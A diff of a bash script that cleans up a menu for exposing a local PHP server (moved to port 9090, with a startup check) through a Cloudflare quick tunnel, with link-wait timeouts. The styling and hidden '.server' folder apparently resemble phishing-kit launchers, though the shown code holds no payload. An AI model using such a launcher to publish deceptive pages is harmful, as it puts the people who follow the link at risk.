@@ -1,9 +1,9 @@
 #!/bin/bash
 
-tunnel_menu(){
+tunnel_menu() {
     { clear; banner | lolcat; banner2; echo; }
 cat << EOF
-    ${green}<<------ ${white}Select an Tunnel Options ${green}------>>${nocolor}
+    ${green}<<------ ${white}Select a Tunnel Option ${green}------>>${nocolor}
 
     ${cyan}[${orange}1${cyan}]${white} Cloudflared
     ${cyan}[${orange}2${cyan}]${white} Localhost
@@ -11,50 +11,95 @@ cat << EOF
     ${cyan}[${red}0${cyan}]${red} Exit ${nocolor}
 
 EOF
-    read -p "    ${cyan}[${green}+${cyan}]${white} Select an options:${blue} " option_tunnel
+    read -p "    ${cyan}[${green}+${cyan}]${white} Select an option:${blue} " option_tunnel
 
     case $option_tunnel in
-        1)
-        start_cloudf;;
-        2)
-        start_localhst;;
-        3)
-        back;;
-        0)
-        exit_msg;;
-        *)
-        invalid_options;;
+        1) start_cloudf ;;
+        2) start_localhst ;;
+        3) back ;;
+        0) exit_msg ;;
+        *) invalid_options ;;
     esac
-
 }
 
+# ─────────────────────────────────────────────────────────────────────────────
+# FIX #1: Detect PHP binary (Parrot OS may use php8.x naming)
+# ─────────────────────────────────────────────────────────────────────────────
+_get_php_bin() {
+    for bin in php php8.3 php8.2 php8.1 php8.0 php7.4; do
+        if command -v "$bin" >/dev/null 2>&1; then
+            echo "$bin"
+            return 0
+        fi
+    done
+    return 1
+}
+
+# ─────────────────────────────────────────────────────────────────────────────
+# Start PHP server on port 9090, verify it actually started
+# ─────────────────────────────────────────────────────────────────────────────
+_start_php_server() {
+    local PHP_BIN
+    PHP_BIN=$(_get_php_bin)
+
+    if [[ -z "$PHP_BIN" ]]; then
+        echo -e "    ${red}[${orange}!${red}]${white} PHP not found! Install with: sudo apt install php${nocolor}"
+        exit 1
+    fi
+
+    # Kill anything already on 9090
+    fuser -k 9090/tcp > /dev/null 2>&1
+
+    echo -e "    ${cyan}[${orange}*${cyan}]${white} Starting PHP server (${green}$PHP_BIN${white})..."
+    cd "$SCRIPT_DIR/.server" && $PHP_BIN -S 127.0.0.1:9090 > /dev/null 2>&1 &
+    sleep 2
+
+    # Verify the server is actually listening
+    if ! ss -tlnp 2>/dev/null | grep -q ':9090' && \
+       ! netstat -tlnp 2>/dev/null | grep -q ':9090'; then
+        echo -e "    ${red}[✖] PHP server failed to start on port 9090! Check PHP installation.${nocolor}"
+        exit 1
+    fi
+
+    echo -e "    ${cyan}[${orange}+${cyan}]${white} Local server: ${green}http://127.0.0.1:9090${nocolor}"
+}
+
+# ─────────────────────────────────────────────────────────────────────────────
+# Cloudflared tunnel
+# --url (double dash) + http:// prefix
+# timeout on link-wait loop
+# ─────────────────────────────────────────────────────────────────────────────
 start_cloudf() {
-    # UI Setup
     { clear; banner | lolcat; banner2; echo; }
     echo -e "${green}    <<------ ${white}Starting Cloudflared Tunnel ${green}------>>${nocolor}"
     echo -e ""
 
-    # PHP Server Start
-    echo -e "    ${cyan}[${orange}*${cyan}]${white} Starting php server..."
-    cd "$SCRIPT_DIR/.server" && php -S 127.0.0.1:3333 > /dev/null 2>&1 &
-    sleep 1
-    echo -e "    ${cyan}[${orange}+${cyan}]${white} Local Server${green} http://127.0.0.1:3333"
+    _start_php_server
 
-    # Starting Cloudflared
     echo -e "    ${cyan}[${orange}*${cyan}]${white} Starting Cloudflared..."
-    cd "$SCRIPT_DIR" || exit
+    cd "$SCRIPT_DIR" || exit 1
     rm -f cf.log
 
-    # Launch cloudflared
-    ./cloudflared tunnel -url 127.0.0.1:3333 --logfile cf.log > /dev/null 2>&1 &
+    # use --url (double dash) and http:// scheme
+    ./cloudflared tunnel --url http://127.0.0.1:9090 --logfile cf.log > /dev/null 2>&1 &
 
-    # Waiting for link 
+    # wait up to 30 seconds for tunnel link
     echo -ne "    ${cyan}[${orange}*${cyan}]${white} Generating link, please wait..."
+    local MAX_WAIT=30
+    local count=0
+    local cf_link=""
+
     while true; do
-        cf_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cf.log" 2>/dev/null)
+        cf_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare\.com' "cf.log" 2>/dev/null)
         if [[ -n "$cf_link" ]]; then
             echo -e "\r    ${cyan}[${orange}+${cyan}]${white} Direct Link: ${green}$cf_link${nocolor}           "
             break
+        fi
+        count=$((count + 1))
+        if [[ $count -ge $MAX_WAIT ]]; then
+            echo -e "\n    ${red}[✖] Cloudflared link generation timed out after ${MAX_WAIT}s.${nocolor}"
+            echo -e "    ${red}[!] Check your cloudflared binary or internet connection.${nocolor}"
+            terminate
         fi
         sleep 1
     done
@@ -63,15 +108,16 @@ start_cloudf() {
     checked
 }
 
-# Local Server Start
-start_localhst(){
+# ─────────────────────────────────────────────────────────────────────────────
+# Localhost only
+# ─────────────────────────────────────────────────────────────────────────────
+start_localhst() {
     { clear; banner | lolcat; banner2; echo; }
     echo -e "${green}    <<------ ${white}Starting Localhost Server ${green}------>>${nocolor}"
     echo -e ""
-    echo -e "    ${cyan}[${orange}*${cyan}]${white} Starting php server..."
-    cd "$SCRIPT_DIR/.server" && php -S 127.0.0.1:3333 > /dev/null 2>&1 &
-    sleep 1
-    echo -e "    ${cyan}[${orange}+${cyan}]${white} Local Server${green} http://127.0.0.1:3333"
+
+    _start_php_server
+
     trap terminate INT
     checked
 }
